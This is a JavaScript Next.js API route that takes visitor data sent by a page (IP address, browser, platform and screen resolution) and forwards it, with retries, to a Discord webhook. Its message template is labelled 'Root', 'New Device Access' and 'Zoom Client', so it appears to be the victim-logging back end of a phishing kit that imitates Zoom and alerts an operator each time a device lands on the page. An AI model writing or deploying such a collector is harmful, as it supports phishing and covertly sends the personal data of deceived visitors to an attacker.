import { NextResponse } from "next/server";

async function sendDiscordMessage(webhookUrl, payload, retries = 3, delay = 5000) {
  for (let i = 0; i < retries; i++) {
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 10000); // 10s timeout

      const res = await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
        signal: controller.signal,
      });

      clearTimeout(timeoutId);

      if (!res.ok) {
        throw new Error(`Discord webhook error: ${res.status} - ${await res.text()}`);
      }

      if (res.status === 204) {
        return null;
      }

      try {
        return await res.json();
      } catch {
        return null;
      }
    } catch (error) {
      console.error(`Retry ${i + 1}/${retries} failed:`, error);
      if (i < retries - 1) {
        await new Promise((resolve) => setTimeout(resolve, delay));
      }
    }
  }
  throw new Error("Failed to send message to Discord after multiple attempts.");
}

export async function POST(req) {
  try {
    if (req.headers.get("content-type") !== "application/json") {
      return NextResponse.json({ error: "Invalid Content-Type" }, { status: 400 });
    }

    const body = await req.json();
    const { ip, browser, platform, screenWidth, screenHeight } = body;

    if (!ip || !browser || !platform) {
      return NextResponse.json({ error: "Missing required fields" }, { status: 400 });
    }

    console.log("✅ Received device info:", body);

    const message = `🧛‍♂️ *Root*\n📢 *New Device Access*\n*Zoom Client*\n\n🌍 IP: ${ip}\n🖥 Platform: ${platform}\n🌐 Browser: ${browser}\n📏 Resolution: ${screenWidth}x${screenHeight}`;

    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

    if (!webhookUrl) {
      console.error("Missing DISCORD_WEBHOOK_URL. Cannot forward device info.");
      return NextResponse.json(
        { error: "Missing DISCORD_WEBHOOK_URL environment variable" },
        { status: 500 }
      );
    }

    console.log("📡 Sending to Discord webhook...");

    const data = await sendDiscordMessage(webhookUrl, {
      content: message,
      allowed_mentions: { parse: [] },
    });

    if (data) {
      console.log("🔄 Discord webhook response:", data);
    } else {
      console.log("🔄 Discord webhook acknowledged (no response body).");
    }

    return NextResponse.json({ success: true, message: "Device info sent to Discord" }, { status: 200 });
  } catch (error) {
    console.error("❌ Error in Discord webhook route:", error);
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
